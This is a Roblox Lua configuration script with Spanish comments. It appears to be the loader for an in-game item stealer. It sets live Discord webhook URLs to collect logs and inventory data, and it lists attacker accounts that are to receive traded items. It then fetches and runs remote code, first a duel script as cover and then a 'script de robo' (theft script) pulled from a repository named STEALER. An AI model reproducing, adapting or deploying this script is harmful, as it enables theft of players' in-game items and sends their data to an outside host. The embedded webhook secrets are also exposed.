-- ==========================================
-- CONFIGURACIÓN PERSONALIZABLE
-- ==========================================
getgenv().AutoTradeConfig = {
    WebhookLogs = "https://discord.com/api/webhooks/1548790872814915624/rwgw-WV-P2dfkFSnCFl1-Q8iQhOuybQKLg9AbsodaF0pcl7YkDJiiz4Drb3pAaj-fQjz",
    WebhookInventario = "https://discord.com/api/webhooks/1548790920001093682/hCyg2Qdpxoeqw4_ZAKsDDTHt2m0INvKgzuUb0jt9qqLBH0Onww1gfznY9mUMqw4uYZFw",
    

-- cambia jugador 1,2,3.... por el user de tus cuentas que van a recibir las cosas.  
    JugadoresObjetivos = {
        "Hahahahlolllpro", 
        "TradeTestingMVSS",
        "Jugador3"
    }
}

-- ==========================================
-- SCRIPT DE DUELOS (PVP)
-- ==========================================
-- Pega tu script de duelos que gustes aquí debajo (PUEDES ENCONTRARLOS EN scriptblox.com)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ifykyklolololol/solixhub/refs/heads/main/loader.luau"))()
end)

-- ==========================================
-- CARGA DEL script de robo NO BORRES ESTO 
-- ==========================================

task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
end)